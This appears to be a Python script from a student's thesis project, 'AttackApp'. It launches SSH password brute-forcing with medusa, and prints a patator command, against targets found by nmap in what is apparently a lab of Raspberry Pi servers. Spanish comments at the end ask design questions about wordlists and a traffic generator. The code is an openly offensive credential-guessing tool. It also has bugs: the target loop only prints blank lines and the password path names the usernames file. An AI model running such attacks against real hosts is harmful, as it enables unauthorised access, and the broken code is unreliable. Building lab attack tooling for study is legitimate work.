
from scanPorts import *
from updateFile import *
#Lo primero que es necesario realizar es un escaneo de puertos con nmap, para obtener la IP de las RaspBerry Pi que tengan servidores apache2

def sshAttack(ssh, targets, sistema, usernarme_dict = "", password_dict = ""):
    if(usernarme_dict == ""):
        usernarme_dict = "/root/Documents/Diccionarios/usernames.txt"
    if(password_dict == ""):
        password_dict = "/root/Documents/Diccionarios/passwords.txt"

    ruta_usernames = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\usernames.txt"
    ruta_passwords = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\usernames.txt"

    updateFile(ssh, "SSHAttack", ruta_usernames, sistema, "usernames.txt")
    updateFile(ssh, "SSHAttack", ruta_passwords, sistema, "passwords.txt")
    for target in targets:
        print("")

    print("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict)
   # stdin, stdout, stderr = ssh.exec_command("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict + " -x ignore:msg='Authentication failed.'")
    stdin, stdout, stderr = ssh.exec_command(
        "medusa -h " + target + " -U " + usernarme_dict + " -P" + password_dict + " -M ssh -f -v 6")

    for line in stdout:
        print('... ' + line.strip('\n'))

    ssh.close()

    print("He terminado de ejecutar el ataque")


'''
#DUDAS:

# Que diccionarios usar?, dejar al usuario poner su propio diccionario en los menús o directamente usar uno en una ubicación dada
y ya si el usuario lo requiere que el lo cambie por el suyo propio.

# Por otro lado, en patator veo que en los comandos te pide el diccionario unicamente para las passwords, pero no pone nada en users.

#Vectores de ataque: El ciberatacante no tiene por qué conocer la red por lo que previamente he optado por realizar un escaneado
mediante nmap para hallar los diferentes dispositivos, el problema es que para realizar dicho escaneado tengo que poner la IP correspondiente
a la red la cual deseo escanear y en esta se enviará a cada uno de los dispositivos (entiendo que mediante broadcast) descubriendo el resto de dispositivos
sin embargo a mi me interesa conocer el resto de redes o subredes para ver que dispositivos tienen el puerto 22 abierto para poder mostrarselo al usuario 
en el menú de la aplicación de tal forma que pueda seleccionar un objetivo a atacar.
¿Cómo hago esto?

#Con respecto a la interfaz se h

#Con respecto al trafficFlow se ha realizado de manera aleatoria peticiones GET a cada una de las direcciones de la web del salonmangamadrid 
se ha puesto entre peticiones un tiempo de 5 segundos entre peticiones. ¿Haría falta modificar dicho tiempo o añadir más factores de aleatoriedad?

Diccionarios = https://miloserdov.org/?p=2701

#Con respecto al archivo TrafficGenerator, concretamente la función trafficFlow se requiere una serie de direcciones(servidores) a los que realizar
las peticiones GET, por consiguiente se ha optado por enviarle un diccionario JSON con la información de todos y cada uno de los dispositivos 
con servidor apache que haya seleccionado el usuario. ¿Sería esto correcto? O, ¿Sería mejor enviar ordenes desde el manager para que las ejecute un cliente
determinado hacia uno o varios servidores?

#¿Scan podría tener la opción -a o únicamente la opción -d en el menúAttack?
'''